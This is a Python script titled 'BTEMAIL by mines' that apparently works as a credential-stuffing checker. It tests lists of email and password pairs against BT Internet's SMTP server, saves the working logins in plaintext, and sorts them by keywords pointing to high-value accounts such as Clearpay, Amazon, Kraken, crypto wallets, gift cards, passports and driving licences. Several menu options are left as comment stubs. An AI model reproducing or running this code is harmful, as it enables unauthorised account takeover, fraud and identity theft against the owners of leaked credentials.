import os
import smtplib
import argparse
import logging

def check_email_login(email, password, server_address='mail.btinternet.com', port=587):
    try:
        with smtplib.SMTP(server_address, port) as server:
            server.starttls()
            server.login(email, password)
        return True
    except smtplib.SMTPAuthenticationError:
        return False

def save_to_file(logins, keyword, output_folder='output'):
    file_name = f"{output_folder}/{keyword.lower()}_logins.txt"
    with open(file_name, 'w') as f:
        for login in logins:
            f.write(f"{login}\n")

def add_login_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            accounts = [line.strip().split(',') for line in file if ',' in line]
        return accounts
    except FileNotFoundError:
        print(f"File not found: {file_path}")
        return []

def view_log_file(log_file_path='email_checker.log'):
    try:
        with open(log_file_path, 'r') as log_file:
            content = log_file.read()
            print(content)
    except FileNotFoundError:
        print(f"Log file not found: {log_file_path}")

def main(input_file=None, output_folder='output', server_address='mail.btinternet.com', port=587):
    # Configure logging
    logging.basicConfig(level=logging.INFO, filename='email_checker.log', filemode='a',
                        format='%(asctime)s - %(levelname)s - %(message)s')

    # Step 1: Get the script's directory
    script_directory = os.path.dirname(os.path.abspath(__file__))

    # Step 2: If input_file is not provided, assume it's in the script's directory
    if input_file is None:
        input_file = os.path.join(script_directory, 'logins.txt')

    # Step 3: Print the path to the input file for debugging
    logging.info("Input file path: %s", input_file)

    # Step 4: Change the working directory to the script's directory
    os.chdir(script_directory)

    # Step 5: Read email accounts from the input file
    try:
        # Read email accounts from the file
        accounts = add_login_from_file(input_file)

        successful_logins = []

        # Step 6: Check login for each account
        for email, password in accounts:
            logging.info("Processing Email: %s, Password: %s", email, '*' * len(password))
            if check_email_login(email, password, server_address, port):
                successful_logins.append(f"Email: {email}, Password: {password}")

        # Print the contents of the successful_logins list for debugging
        logging.info("Successful Logins: %s", successful_logins)

        # Step 7: Save all successful logins to a file
        save_to_file(successful_logins, 'all', output_folder)

        # Update the search_keywords list with additional keywords
        search_keywords = ['clearpay', 'amazon', 'kraken', 'cryptocurrency', 'wallet',
                           'jd williams', 'deliveroo', 'reward', 'gift cards', 'passport', 'driving licence']

        # Step 8: Save filtered logins for specific keywords
        for keyword in search_keywords:
            filtered_logins = [login for login in successful_logins if keyword in login.lower()]
            save_to_file(filtered_logins, keyword, output_folder)

    except Exception as e:
        logging.error("Error reading or processing file: %s", e)

if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='Email Login Checker')
    parser.add_argument('--input', dest='input_file', default='logins.txt', help='Input file path')
    parser.add_argument('--output', dest='output_folder', default='output', help='Output folder')
    parser.add_argument('--server', dest='server_address', default='mail.btinternet.com', help='SMTP server address')
    parser.add_argument('--port', dest='port', type=int, default=587, help='SMTP server port')
    args = parser.parse_args()

    # Interactive menu to add logins
    banner = """
  _______ _     _ _______     _______ _     _ _______
 |__   __| |   | |__   __|   |__   __| |   | |__   __|
    | |  | |___| |   | |____     | |  | |___| |   | |
    |_|  |_____|_|   |______|    |_|  |_____|_|   |_|
                    BTEMAIL by mines
    """

    print(banner)

    while True:
        print("\nMenu:")
        print("1. Add Login from File")
        print("2. View Successful Logins")
        print("3. View Filtered Logins")
        print("4. Change Output Folder")
        print("5. Configure SMTP Server")
        print("6. Modify Search Keywords")
        print("7. Clear Logins")
        print("8. Export Results")
        print("9. Help")
        print("10. Exit")
        print("11. Add and Start Searching")
        print("12. View Log File")
        print("13. Change Log Level")

        choice = input("Enter your choice (1-13): ")

        if choice == '1':
            file_path = input("Enter the path to the file containing email and password pairs: ")
            accounts = add_login_from_file(file_path)
            print("Added logins from file.")
        elif choice == '2':
            # ... view successful logins functionality ...
        elif choice == '3':
            # ... view filtered logins functionality ...
        elif choice == '4':
            # ... change output folder functionality ...
        elif choice == '5':
            # ... configure SMTP server functionality ...
        elif choice == '6':
            # ... modify search keywords functionality ...
        elif choice == '7':
            # ... clear logins functionality ...
        elif choice == '8':
            # ... export results functionality ...
        elif choice == '9':
            # ... display help information ...
        elif choice == '10':
            print("Exiting. Thank you!")
            break
        elif choice == '11':
            main(input_file=args.input_file, output_folder=args.output_folder,
                 server_address=args.server_address, port=args.port)
        elif choice == '12':
            view_log_file()
        elif choice == '13':
            # ... change log level functionality ...
        else:
            print("Invalid choice. Please enter a number between 1 and 13.")

